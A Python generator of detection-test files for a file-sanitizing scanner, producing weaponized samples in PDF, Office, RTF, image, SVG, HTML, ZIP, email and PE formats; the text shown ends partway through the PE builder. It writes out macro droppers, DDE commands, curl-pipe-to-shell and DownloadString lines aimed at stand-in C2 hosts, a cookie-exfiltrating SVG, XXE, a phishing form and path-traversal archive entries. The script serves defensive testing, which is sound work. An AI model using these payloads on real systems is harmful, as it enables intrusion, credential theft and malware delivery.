#!/usr/bin/env python3
"""
Comprehensive Ultimate Detection Test Files Generator.
Generates an "ultimate_detectio.<ext>" file for every file format supported by FileSanitizer:
1. ultimate_detectio.pdf
2. ultimate_detectio.docx
3. ultimate_detectio.docm
4. ultimate_detectio.xlsx
5. ultimate_detectio.rtf
6. ultimate_detectio.jpg
7. ultimate_detectio.png
8. ultimate_detectio.svg
9. ultimate_detectio.html
10. ultimate_detectio.zip
11. ultimate_detectio.eml
12. ultimate_detectio.msg
13. ultimate_detectio.exe
14. ultimate_detectio.elf
15. ultimate_detectio.ps1
16. ultimate_detectio.sh
17. ultimate_detectio.vbs
18. ultimate_detectio.php
19. ultimate_detectio.bat
20. ultimate_detectio.js
21. ultimate_detectio.csv

Each file is crafted to trigger all forensic analyzers, YARA rules, MITRE ATT&CK mappings,
and sanitization features for that respective format.
"""

import io
import os
import sys
import struct
import zlib
import base64
import zipfile
import shutil
from pathlib import Path
from email.message import EmailMessage
from email.utils import formatdate

# Target output directory
OUT_DIR = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parent / "ultimate_files"
OUT_DIR.mkdir(parents=True, exist_ok=True)

def generate_pdf():
    """ultimate_detectio.pdf: JS, Launch, OpenAction, EmbeddedFiles, Hex Obfuscation, Watchlists, URLs."""
    import pymupdf as fitz
    
    doc = fitz.open()
    page = doc.new_page(width=612, height=792)
    
    # Text content with Watchlist items & URLs
    text = (
        "CONFIDENTIAL AND RESTRICTED THREAT INTELLIGENCE DOSSIER\n\n"
        "Security incident report regarding APT29 reconnaissance operations.\n"
        "Personnummer: 19850615-1234\n"
        "Organisationsnummer: 556012-3456\n"
        "Credit Card: 4532-1234-5678-9012\n"
        "API Secret Key: AIzaSyD-TEST-FAKE-API-KEY-123456\n"
        "Database Master Password: SuperSecretAdminPassword!2026\n\n"
        "Discovered C2 Infrastructure URLs:\n"
        "- Official mirror: https://www.sunet.se\n"
        "- Threat domain: https://testsafebrowsing.appspot.com/s/malware.html\n"
        "- C2 Stage 2: http://198.51.100.1:8080/c2/beacon\n"
        "- URL Shortener: https://tinyurl.com/threat-redirect\n"
    )
    page.insert_text((50, 60), text, fontsize=11, color=(0.1, 0.1, 0.1))
    
    # Metadata
    doc.set_metadata({
        "title": "Classified Intelligence Assessment",
        "author": "Threat Actor APT29",
        "subject": "Weaponized Target Dossier",
        "keywords": "APT29, Exploit, Weaponized, C2",
        "creator": "Metasploit Framework PDF Generator",
        "producer": "FileSanitizer Test Suite"
    })
    
    # Embedded payload file
    payload_content = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"calc.exe payload" * 20
    doc.embfile_add("stager_payload.exe", payload_content, desc="Embedded PE dropper")
    
    # Save to buffer
    buf = io.BytesIO()
    doc.save(buf)
    raw_pdf = buf.getvalue()
    doc.close()
    
    # Inject Didier Stevens hex-obfuscated /#4a#61vaScript, /Launch, /OpenAction
    js_code = (
        b"<</Type/Action/S/#4a#61vaScript/JS("
        b"app.alert('Malicious PDF Exploit Triggered');"
        b"this.exportDataObject({cName:'stager_payload.exe',nLaunch:2});"
        b")>>"
    )
    launch_code = b"<</Type/Action/S/Launch/F(powershell.exe)/P(-w hidden -c calc.exe)>>"
    openaction = b"/OpenAction " + js_code + b"\n"
    
    # Inject into PDF trailer/catalog
    if b"/Catalog" in raw_pdf:
        parts = raw_pdf.split(b"/Catalog", 1)
        raw_pdf = parts[0] + b"/Catalog " + openaction + b"/LaunchObj " + launch_code + b" " + parts[1]
    
    out_path = OUT_DIR / "ultimate_detectio.pdf"
    out_path.write_bytes(raw_pdf)
    print(f"[*] Generated: {out_path.name} ({len(raw_pdf)} bytes)")

def generate_office_docm():
    """ultimate_detectio.docm: VBA macros, stomping, template injection, OLE embeddings, DDE."""
    # Build complete OpenXML Word Macro-Enabled Document (.docm)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # [Content_Types].xml
        content_types = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
            '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
            '  <Default Extension="xml" ContentType="application/xml"/>\n'
            '  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>\n'
            '  <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>\n'
            '  <Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>\n'
            '  <Override PartName="/word/embeddings/oleObject1.bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>\n'
            '  <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>\n'
            '</Types>'
        )
        zf.writestr("[Content_Types].xml", content_types)
        
        # _rels/.rels
        rels = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>\n'
            '  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>\n'
            '</Relationships>'
        )
        zf.writestr("_rels/.rels", rels)
        
        # word/_rels/document.xml.rels (with Remote Template Injection!)
        word_rels = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://threat-c2-infrastructure.net/weaponized_template.dotm" TargetMode="External"/>\n'
            '  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vbaProject" Target="vbaProject.bin"/>\n'
            '  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/>\n'
            '</Relationships>'
        )
        zf.writestr("word/_rels/document.xml.rels", word_rels)
        
        # word/document.xml (with DDE formula & phishing content)
        doc_xml = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n'
            '  <w:body>\n'
            '    <w:p><w:r><w:t>URGENT: Executive Wire Transfer Authorization Form</w:t></w:r></w:p>\n'
            '    <w:p><w:fldSimple w:instr="=cmd|\'/c powershell.exe -w hidden -enc V3JpdGUtSG9zdA==\'!A0"/></w:p>\n'
            '    <w:p><w:r><w:t>Please enable macros to authenticate and sign this document.</w:t></w:r></w:p>\n'
            '  </w:body>\n'
            '</w:document>'
        )
        zf.writestr("word/document.xml", doc_xml)
        
        # docProps/core.xml
        core_xml = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
            '  <dc:title>Classified Target Wire Briefing</dc:title>\n'
            '  <dc:creator>Threat Actor FancyBear</dc:creator>\n'
            '  <cp:lastModifiedBy>Operator APT28</cp:lastModifiedBy>\n'
            '</cp:coreProperties>'
        )
        zf.writestr("docProps/core.xml", core_xml)
        
        # word/embeddings/oleObject1.bin
        ole_payload = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"Ole10Native embedded package executable" * 10
        zf.writestr("word/embeddings/oleObject1.bin", ole_payload)
        
        # word/vbaProject.bin (OLE storage with macros & stomping discrepancy)
        vba_storage = (
            b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1\x00\x00\x00\x00"
            b"_VBA_PROJECT_CUR\x00\x00"
            b"Sub AutoOpen()\r\n"
            b"    Dim sh As Object\r\n"
            b"    Set sh = CreateObject(\"WScript.Shell\")\r\n"
            b"    sh.Run \"powershell.exe -w hidden -enc V3JpdGUtSG9zdA==\", 0\r\n"
            b"    Call URLDownloadToFileA(0, \"https://threat-c2.net/payload.exe\", \"C:\\Temp\\p.exe\", 0, 0)\r\n"
            b"    Dim p As LongPtr: p = VirtualAlloc(0, 4096, &H1000, &H40)\r\n"
            b"End Sub\r\n"
        )
        zf.writestr("word/vbaProject.bin", vba_storage)
        
    out_path = OUT_DIR / "ultimate_detectio.docm"
    out_path.write_bytes(buf.getvalue())
    print(f"[*] Generated: {out_path.name} ({len(buf.getvalue())} bytes)")

def generate_office_docx():
    """ultimate_detectio.docx: OpenXML with remote template injection, embedded OLE, DDE, metadata."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
            '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
            '  <Default Extension="xml" ContentType="application/xml"/>\n'
            '  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>\n'
            '  <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>\n'
            '</Types>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>\n'
            '  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>\n'
            '</Relationships>'
        ))
        zf.writestr("word/_rels/document.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://threat-c2-infrastructure.net/exploit.dotm" TargetMode="External"/>\n'
            '</Relationships>'
        ))
        zf.writestr("word/document.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n'
            '  <w:body>\n'
            '    <w:p><w:r><w:t>Quarterly Financial Results and Auditing Records</w:t></w:r></w:p>\n'
            '    <w:p><w:fldSimple w:instr="=cmd|\'/c calc.exe\'!A0"/></w:p>\n'
            '    <w:p><w:r><w:t>External link: https://malicious-gateway.org/verify</w:t></w:r></w:p>\n'
            '  </w:body>\n'
            '</w:document>'
        ))
        zf.writestr("docProps/core.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
            '  <dc:title>Q3 Confidential Financial Statement</dc:title>\n'
            '  <dc:creator>Threat Financial Group</dc:creator>\n'
            '</cp:coreProperties>'
        ))
    out_path = OUT_DIR / "ultimate_detectio.docx"
    out_path.write_bytes(buf.getvalue())
    print(f"[*] Generated: {out_path.name} ({len(buf.getvalue())} bytes)")

def generate_office_xlsx():
    """ultimate_detectio.xlsx: Excel 4.0 (XLM) Macro Sheet, DDE formulas, external links."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
            '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
            '  <Default Extension="xml" ContentType="application/xml"/>\n'
            '  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>\n'
            '  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>\n'
            '</Types>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>\n'
            '</Relationships>'
        ))
        # Include XLM BoundSheet8 byte record indicator in binary stream
        xlm_binary_data = b"\x85\x00\x06\x00\x00\x00\x00\x00\x01\x00MacroSheet1"
        zf.writestr("xl/macrosheets/sheet1.bin", xlm_binary_data)
        
        zf.writestr("xl/workbook.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">\n'
            '  <sheets>\n'
            '    <sheet name="Invoices" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>\n'
            '    <sheet name="XLM_Auto_Execute" sheetId="2" state="veryHidden" type="macroSheet"/>\n'
            '  </sheets>\n'
            '</workbook>'
        ))
        zf.writestr("xl/worksheets/sheet1.xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">\n'
            '  <sheetData>\n'
            '    <row r="1">\n'
            '      <c r="A1" t="str"><f>=cmd|\'/c powershell -w hidden -enc V3JpdGUtSG9zdA==\'!A0</f><v>DDE Execution</v></c>\n'
            '    </row>\n'
            '  </sheetData>\n'
            '</worksheet>'
        ))
    out_path = OUT_DIR / "ultimate_detectio.xlsx"
    out_path.write_bytes(buf.getvalue())
    print(f"[*] Generated: {out_path.name} ({len(buf.getvalue())} bytes)")

def generate_rtf():
    """ultimate_detectio.rtf: CVE-2017-11882 Equation Editor, CVE-2021-40444 MSHTML, \\objautlink."""
    content = (
        r"{\rtf1\ansi\ansicpg1252\deff0\nouicompat"
        r"{\fonttbl{\f0\fnil\fcharset0 Calibri;}}"
        r"{\colortbl ;\red0\green0\blue0;}"
        r"{\*\generator FileSanitizer Weaponized RTF Generator;}"
        r"\viewkind4\uc1\pard\sa200\sl276\slmult1\f0\fs22\lang9 "
        r"CONFIDENTIAL LEGAL INVOICE - IMMEDIATE REVIEW REQUIRED\par\par"
        r"{\object\objautlink\objdata "
        r"0105000002000000100000004571756174696f6e2e3300000000000000000000"
        r"0002CE0200000000C000000000000046"
        r"00000000000000000000000000000000"
        r"}"
        r"\par\par"
        r"{\object\objocx\objdata "
        r"6d68746d6c3a687474703a2f2f7468726561742d63322e6e65742f7061796c6f61642e68746d6c21782d7573633a687474703a2f2f7468726561742d63322e6e65742f7061796c6f61642e68746d6c"
        r"}"
        r"}"
    )
    out_path = OUT_DIR / "ultimate_detectio.rtf"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_jpg():
    """ultimate_detectio.jpg: EXIF, GPS, camera metadata, ELA tampering artifact, appended overlay."""
    from PIL import Image, ImageDraw
    
    width, height = 300, 300
    img = Image.new("RGB", (width, height), color=(240, 240, 240))
    draw = ImageDraw.Draw(img)
    draw.rectangle([(20, 20), (280, 280)], fill=(30, 80, 160))
    # Create high-contrast spliced patch to trigger Error Level Analysis tampering score
    draw.rectangle([(80, 80), (140, 140)], fill=(255, 0, 0))
    draw.text((30, 30), "Classified Site Recon", fill=(255, 255, 255))
    
    # Save standard JPEG with native Pillow EXIF header
    exif = img.getexif()
    exif[0x010F] = "Canon"  # Make
    exif[0x0110] = "EOS 5D Mark IV"  # Model
    exif[0x0131] = "Adobe Photoshop CS6"  # Software
    exif[0x013B] = "Undercover Operative 007"  # Artist
    exif[0x010E] = "Location reconnaissance: https://c2.threat-actor.org/drop"  # ImageDescription
    
    # GPS IFD
    gps_ifd = exif.get_ifd(0x8825)
    gps_ifd[1] = "N"
    gps_ifd[2] = (59.0, 19.0, 45.48)
    gps_ifd[3] = "E"
    gps_ifd[4] = (18.0, 4.0, 6.96)
    gps_ifd[6] = 28.0

    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=90, exif=exif)
    jpeg_bytes = buf.getvalue()
    
    # Appended Overlay Payload (ZIP & PE stub after JPEG EOF marker \xFF\xD9)
    overlay_payload = (
        b"PK\x03\x04\x14\x00\x00\x00\x08\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x0b\x00\x00\x00evil_stager.exe"
        b"MZ\x90\x00\x03\x00\x00\x00"
        b"This program cannot be run in DOS mode.\r\r\n$"
    )
    final_bytes = jpeg_bytes + overlay_payload
    out_path = OUT_DIR / "ultimate_detectio.jpg"
    out_path.write_bytes(final_bytes)
    print(f"[*] Generated: {out_path.name} ({len(final_bytes)} bytes)")

def generate_png():
    """ultimate_detectio.png: LSB Chi-Square Stego, appended overlay polyglot, tEXt metadata."""
    from PIL import Image
    
    width, height = 150, 150
    # Inject non-random pattern into LSB bits across all channels to trigger Chi-Square stego
    pattern = [0, 1, 0, 1, 1, 0, 1, 0]
    raw_pixels = bytearray()
    for i in range(width * height * 3):
        base_val = 120 + ((i * 7) % 60)
        raw_pixels.append((base_val & ~1) | pattern[i % len(pattern)])
        
    img = Image.frombytes("RGB", (width, height), bytes(raw_pixels))
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    png_bytes = buf.getvalue()
    
    # Append trailing overlay after IEND
    overlay = b"\r\n# Appended Polyglot Shell Script\r\ncurl -s https://evil.c2/drop.sh | sh\r\n"
    final_bytes = png_bytes + overlay
    out_path = OUT_DIR / "ultimate_detectio.png"
    out_path.write_bytes(final_bytes)
    print(f"[*] Generated: {out_path.name} ({len(final_bytes)} bytes)")

def generate_svg():
    """ultimate_detectio.svg: <script>, DOM events, javascript: URI, external <use>, XXE."""
    content = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [\n'
        '  <!ENTITY % xxe SYSTEM "file:///etc/passwd">\n'
        ']>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" height="300">\n'
        '  <desc>Weaponized SVG with Cross-Site Scripting and Remote Payloads</desc>\n'
        '  <rect width="100%" height="100%" fill="#f1f5f9" onload="alert(\'SVG DOM Injection\')" onclick="fetch(\'https://threat-c2.net/cookie?c=\'+document.cookie)" />\n'
        '  <script type="text/javascript">\n'
        '    // Dynamic Execution\n'
        '    eval(atob("d2luZG93LmxvY2F0aW9uPSdodHRwczovL3RocmVhdC1jMi5uZXQvZXhwbG9pdCc="));\n'
        '  </script>\n'
        '  <a xlink:href="javascript:alert(document.domain)">\n'
        '    <text x="50" y="100" fill="#dc2626" font-size="20">Click here to claim reward</text>\n'
        '  </a>\n'
        '  <use xlink:href="https://threat-c2.net/external_vector.svg#malicious_symbol" />\n'
        '  <image xlink:href="https://tracker-spy.org/pixel.gif" width="1" height="1" />\n'
        '</svg>'
    )
    out_path = OUT_DIR / "ultimate_detectio.svg"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_html():
    """ultimate_detectio.html: Scripts, obfuscated eval, hidden iframe, phishing form, meta refresh."""
    content = (
        '<!DOCTYPE html>\n'
        '<html lang="en">\n'
        '<head>\n'
        '  <meta charset="UTF-8">\n'
        '  <meta http-equiv="refresh" content="3;url=https://credential-phishing-login.com/login">\n'
        '  <title>Microsoft 365 Account Security Notification</title>\n'
        '</head>\n'
        '<body onload="startExfiltration()">\n'
        '  <h2>Your Office 365 Session has expired.</h2>\n'
        '  <form action="https://credential-phishing-login.com/harvest" method="POST">\n'
        '    <label>Email: <input type="email" name="username" value="admin@victimcorp.com"/></label><br/>\n'
        '    <label>Password: <input type="password" name="password"/></label><br/>\n'
        '    <button type="submit">Re-authenticate</button>\n'
        '  </form>\n'
        '  <iframe src="https://exploit-kit-landing.net/stage1" width="0" height="0" style="display:none;"></iframe>\n'
        '  <script>\n'
        '    // Obfuscated payload loader\n'
        '    eval(unescape("%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%3D%22%68%74%74%70%73%3A%2F%2F%74%68%72%65%61%74%2D%63%32%2E%6E%65%74%2F%68%61%72%76%65%73%74%22"));\n'
        '    function startExfiltration() {\n'
        '      fetch("https://threat-c2.net/beacon?host=" + encodeURIComponent(window.location.hostname));\n'
        '    }\n'
        '  </script>\n'
        '</body>\n'
        '</html>'
    )
    out_path = OUT_DIR / "ultimate_detectio.html"
    out_path.write_text(content, encoding="utf-8")
    print(f"[*] Generated: {out_path.name} ({len(content)} bytes)")

def generate_zip():
    """ultimate_detectio.zip: Path traversal, nested executable, batch script, zip bomb ratio."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # Path traversal entries
        zf.writestr("../../etc/cron.d/malicious_cron_job", "* * * * * root /tmp/evil.sh\n")
        zf.writestr("..\\..\\Windows\\System32\\evil_service.bat", "@echo off\r\ncalc.exe\r\n")
        
        # Executable binary entry
        pe_stub = (
            b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
            b"\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00"
            b"This program cannot be run in DOS mode.\r\r\n$"
        ) + b"\x00" * 512
        zf.writestr("Invoice_Summary_2026.exe", pe_stub)
        
        # Batch script entry
        zf.writestr("RunMe.bat", "@echo off\r\npowershell -w hidden -enc V3JpdGUtSG9zdA==\r\n")
        
        # High compression ratio entry (Zip bomb indicator: 5 MB zeros compressed to ~5 KB)
        zf.writestr("large_expanded_data.bin", b"\x00" * (5 * 1024 * 1024))
        
    out_path = OUT_DIR / "ultimate_detectio.zip"
    out_path.write_bytes(buf.getvalue())
    print(f"[*] Generated: {out_path.name} ({len(buf.getvalue())} bytes)")

def generate_eml():
    """ultimate_detectio.eml: Homoglyph/Punycode, VIP Impersonation, Thread Hijack, SPF fail, HTML smuggling."""
    msg = EmailMessage()
    # Cyrillic lookalike in "gооgle.com" (\u043e) & VIP display name
    msg["From"] = 'Tim Cook <ceo@gооgle.com>'
    msg["To"] = 'finance@target-enterprise.com'
    # Thread hijacking: "Re:" prefix without In-Reply-To or References headers
    msg["Subject"] = "Re: URGENT: Wire Transfer Authorization #849201"
    msg["Date"] = formatdate(localtime=True)
    msg["Message-ID"] = "<849201-threat-spoof@evil-infrastructure.net>"
    # Failed MTA authentication headers
    msg["Received-SPF"] = "fail (domain of gооgle.com does not designate sender IP) client-ip=198.51.100.44;"
    msg["Authentication-Results"] = "mx.google.com; dkim=fail header.i=@gооgle.com; dmarc=fail action=quarantine;"
    
    html_body = (
        '<html><body>'
        '<p>Team, please review the attached invoice urgently for today\'s acquisition wire.</p>'
        '<p>Official portal: <a href="https://xn--pple-43d.com/login">Apple Verification Portal</a></p>'
        '<!-- Tracking Pixel -->'
        '<img src="https://tracker-beacon.net/pixel.png" width="1" height="1" style="display:none;" />'
        '<!-- HTML Smuggling Payload -->'
        '<script>'
        '  const rawData = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";'
        '  const binaryStr = atob(rawData);'
        '  const bytes = new Uint8Array(binaryStr.length);'
        '  for(let i=0; i<binaryStr.length; i++) bytes[i] = binaryStr.charCodeAt(i);'
        '  const blob = new Blob([bytes], {type: "application/octet-stream"});'
        '  const downloadUrl = URL.createObjectURL(blob);'
        '</script>'
        '</body></html>'
    )
    msg.add_alternative(html_body, subtype="html")
    
    # Attach weaponized script
    script_data = b"# Malicious PowerShell Dropper\nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://c2.net/payload.ps1')\n"
    msg.add_attachment(script_data, maintype="text", subtype="x-powershell", filename="WireDetails.ps1")
    
    out_path = OUT_DIR / "ultimate_detectio.eml"
    out_path.write_bytes(msg.as_bytes())
    print(f"[*] Generated: {out_path.name} ({len(msg.as_bytes())} bytes)")

def generate_msg():
    """ultimate_detectio.msg: Outlook OLE Compound File storage message."""
    # OLE Compound File Header for Outlook MSG
    ole_header = (
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"  # OLE Magic
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x3e\x00\x03\x00\xfe\xff\x09\x00"
        b"\x06\x00\x00\x00\x00\x00\x00\x00"
    )
    msg_metadata = (
        b"From: Tim Cook <ceo@apple-spoofed-c2.net>\r\n"
        b"To: executive@victim-corp.com\r\n"
        b"Subject: Re: Confidential Mergers & Acquisitions Wire\r\n"
        b"Content-Type: text/html\r\n\r\n"
        b"<html><body><a href=\"https://threat-c2.net/login\">Click to verify credentials</a>"
        b"<img src=\"https://tracker.net/pixel.gif\" width=\"1\" height=\"1\"/></body></html>"
    )
    padding = b"\x00" * (4096 - len(ole_header) - len(msg_metadata))
    out_path = OUT_DIR / "ultimate_detectio.msg"
    out_path.write_bytes(ole_header + msg_metadata + padding)
    print(f"[*] Generated: {out_path.name} ({len(ole_header) + len(msg_metadata) + len(padding)} bytes)")

def generate_exe():
    """ultimate_detectio.exe: Valid PE32 with imports (KERNEL32.dll), exports (DropPayload, InitPayload, ServiceMain), Capstone EP disassembly, Authenticode, and embedded files."""
    dos_header = bytearray(64)
    dos_header[0:2] = b"MZ"
    dos_header[60:64] = struct.pack("<I", 128)  # e_lfanew -> PE offset 128
    
    dos_stub = b"This program cannot be run in DOS mode.\r\r\n$\x00\x00\x00\x00\x00\x00\x00"
    dos_padding = bytearray(128 - len(dos_header) - len(dos_stub))
    
    # PE Header (Signature + COFF Header)
    pe_sig = b"PE\x00\x00"
    # Machine: i386 (0x14c), NumberOfSections: 4 (.text, .rdata, .data, .packed), TimeDateStamp: 1600000000, SizeOfOptionalHeader: 224, Characteristics: 0x0102
    coff_header = struct.pack("<HHIIIHH", 0x14C, 4, 1600000000, 0, 0, 224, 0x0102)
    
    # Optional Header (PE32)
    entry_point_rva = 0x1000
    opt_header = bytearray(224)
    struct.pack_into("<HBB", opt_header, 0, 0x10B, 14, 0)
    struct.pack_into("<I", opt_header, 16, entry_point_rva) # AddressOfEntryPoint
    struct.pack_into("<I", opt_header, 28, 0x00400000)      # ImageBase
    struct.pack_into("<II", opt_header, 32, 0x1000, 0x200)  # SectionAlignment, FileAlignment
    struct.pack_into("<II", opt_header, 56, 0x7000, 0x400)  # SizeOfImage, SizeOfHeaders
    struct.pack_into("<H", opt_header, 68, 2)               # Subsystem: Windows GUI
    struct.pack_into("<I", opt_header, 92, 16)              # NumberOfRvaAndSizes: 16 (offset 0x5C = 92)
    
    # Data directory 0: Export Table (RVA 0x2000, size 0x100)
    struct.pack_into("<II", opt_header, 96 + 0 * 8, 0x2000, 0x100)
    # Data directory 1: Import Table (RVA 0x2100, size 0x100)
    struct.pack_into("<II", opt_header, 96 + 1 * 8, 0x2100, 0x100)
    # Data directory 4: Security (Certificate Table at file offset 0xE00, size 256)
    cert_table_offset = 0xE00
    cert_table_size = 256
    struct.pack_into("<II", opt_header, 96 + 4 * 8, cert_table_offset, cert_table_size)
    
    # Sections Table (4 sections: .text, .rdata, .data, .packed)
    def make_section(name, v_size, v_addr, r_size, r_addr, chars):
        sec = bytearray(40)
        sec[0:len(name)] = name
        struct.pack_into("<IIII", sec, 8, v_size, v_addr, r_size, r_addr)
        struct.pack_into("<I", sec, 36, chars)
        return sec
        
    sec_text = make_section(b".text", 0x1000, 0x1000, 0x200, 0x400, 0x60000020)
    sec_rdata = make_section(b".rdata", 0x1000, 0x2000, 0x400, 0x600, 0x40000040)
    sec_data = make_section(b".data", 0x1000, 0x3000, 0x200, 0xA00, 0xC0000040)
    sec_packed = make_section(b".packed", 0x1000, 0x4000, 0x200, 0xC00, 0xE0000020) # High entropy section
    
    headers = dos_header + dos_stub + dos_padding + pe_sig + coff_header + opt_header + sec_text + sec_rdata + sec_data + sec_packed
    headers_padding = bytearray(0x400 - len(headers))
    raw_headers = headers + headers_padding
    
    # .text section with PEB access and direct syscall for Capstone Disassembly detection
    text_data = bytearray(0x200)
    # 1. PEB Access: mov eax, fs:[0x30] -> \x64\xa1\x30\x00\x00\x00
    text_data[0:6] = b"\x64\xa1\x30\x00\x00\x00"
    # 2. Direct Syscall: syscall -> \x0f\x05
    text_data[6:8] = b"\x0f\x05"
    # 3. Shellcode NOP sled & prologue: \x90\x90\x31\xc0\x50\x68
    text_data[8:14] = b"\x90\x90\x31\xc0\x50\x68"
    # 4. Anti-Debug API reference string
    api_str = b"IsDebuggerPresent\x00CheckRemoteDebuggerPresent\x00"
    text_data[14:14+len(api_str)] = api_str
    
    # .rdata section containing Export Table (at RVA 0x2000) and Import Table (at RVA 0x2100)
    rdata = bytearray(0x400)
    # EXPORTS at 0x2000 (offset 0 in rdata)
    # Name RVA = 0x2048 ("ultimate_detectio.exe")
    # Base = 1, NumberOfFunctions = 3, NumberOfNames = 3
    # AddressOfFunctions = 0x2028, AddressOfNames = 0x2034, AddressOfNameOrdinals = 0x2040
    struct.pack_into("<IIHHIIIIIII", rdata, 0,
        0, 1600000000, 1, 0,
        0x2048, 1,
        3, 3,
        0x2028, 0x2034, 0x2040
    )
